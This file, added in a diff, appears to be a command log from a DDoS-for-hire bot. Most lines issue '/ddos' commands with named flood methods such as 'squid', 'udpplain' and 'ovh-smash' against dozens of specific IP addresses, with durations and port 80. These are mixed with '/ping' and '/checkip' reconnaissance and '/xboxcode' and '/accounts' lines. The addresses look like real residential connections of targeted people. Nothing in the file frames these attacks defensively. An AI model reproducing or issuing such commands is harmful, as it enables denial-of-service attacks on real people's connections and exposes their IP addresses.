@@ -1,0 +1,91 @@
+/info
+/serverinfo
+/checkserver
+/checkservers
+/plan
+/accounts
+/xboxcode
+/method
+/methods
+/methods
+/checkip IP_ADDRESS 98.204.196.24
+/ddos kraken squid 73.113.149.104 3074
+/ddos kraken squid 73.113.149.104 120 80
+/checkip 184.90.142.242
+/ddos godzilla squid  75.85.190.248 120 80
+/ddos kraken squid  75.85.190.248 600 80
+/ddos kraken squid  75.85.190.248 120 80
+/ddos kraken squid  75.85.190.248 120 80
+/accounts
+/xboxcode
+/ddos kraken squid  75.85.190.248 120 80
+/ddos kraken squid  75.85.190.248 120 80
+/ddos kraken squid  76.189.222.138 120 80
+/ddos kraken squid 71.58.207.228 120 80
+/ddos kraken squid     67.82.25.19120 80
+/xboxcode
+/serverinfo
+/ping 50.65.66.237
+/ddos kraken squid 50.65.66.237 120 80
+/ping 72.193.7.184
+/ddos kraken udpplain 72.193.7.184 120 80
+/ping 72.193.7.184
+/ddos kraken squid 24.183.151.78 120 80
+/ddos kraken squid 24.183.151.78 120 80
+/ddos kraken squid 184.90.142.242 120 80
+/ddos kraken squid 104.58.148.24 120 80
+/ping 104.58.148.24
+/ddos kraken squid  76.214.168.29 120 80
+/ddos kraken squid  173.21.189.209 120 80
+/ddos kraken squid 104.6.56.18 120 80
+/ddos godzilla udp  173.21.189.209 120 80
+/ddos kraken squid 104.6.56.18 120 80
+/ddos kraken squid 76.214.168.29 120 80
+/methods
+/ddos kraken squid 76.214.168.29 120 80
+/ddos godzilla std 104.58.148.24 120 80
+/ddos kraken squid 76.214.168.29 120 80
+/ddos godzilla udp  173.21.189.209 120 80
+/ddos kraken squid  173.21.189.209 120 80
+/ddos godzilla udp  173.21.189.209 120 80
+/ddos kraken squid 75.183.149.211 120 80
+/ddos kraken squid 24.168.208.134 120 80
+/ddos kraken squid 24.168.208.134 120 80
+/ddos kraken squid 75.183.149.211 120 80
+/ddos kraken squid 75.183.149.211 20 80
+/ddos kraken squid 47.41.52.78 120 80
+/ddos kraken squid 47.41.52.78 120 80
+/ddos kraken squid 47.41.52.78 120 80
+/ddos kraken squid 108.224.167.14 120 80
+/ddos kraken squid 108.224.167.14 120 80
+/ddos kraken udpplain 108.224.167.14 120 80
+/serverinfo
+/methods
+/ddos kraken udpplain 108.224.167.14 120 80
+/ping 108.224.167.14
+/ddos kraken squid 73.175.3.82 35 80
+/ddos kraken squid 73.175.3.82 100 80
+/ddos kraken squid 97.113.145.118 120 80
+/ddos kraken squid  71.208.234.178 100 80
+/ddos kraken squid  68.2.255.45 100 80
+/serverinfo
+/ddos kraken squid 65.191.219.6 120 80
+/ddos kraken ovh-smash 174.115.184.148 120 80
+/ddos kraken squid 24.22.255.218 120 80
+/ddos kraken squid 67.169.250.151 120 80
+/ddos kraken squid     67.169.250.151 100 80
+/ddos kraken squid 24.22.255.218 80 80
+/ddos kraken ovh-smash 24.22.255.218 80 80
+/ping 24.22.255.218
+/ddos kraken squid 69.120.68.54 100 80
+/ddos kraken squid 67.9.150.120 120 80
+/ddos kraken squid  65.191.136.148 120 80
+/ddos kraken squid  71.194.144.192 100 80
+/ddos kraken squid  71.194.144.192 100 80
+/ddos kraken squid 76.97.36.8 120 80
+/ddos kraken squid 162.84.144.24 120 80
+/ddos kraken squid 74.108.116.125 100 80
+/ping 74.108.116.125
+/ddos kraken ovh-smash 74.108.116.125 100 80
+/ping 74.108.116.125
+/plan
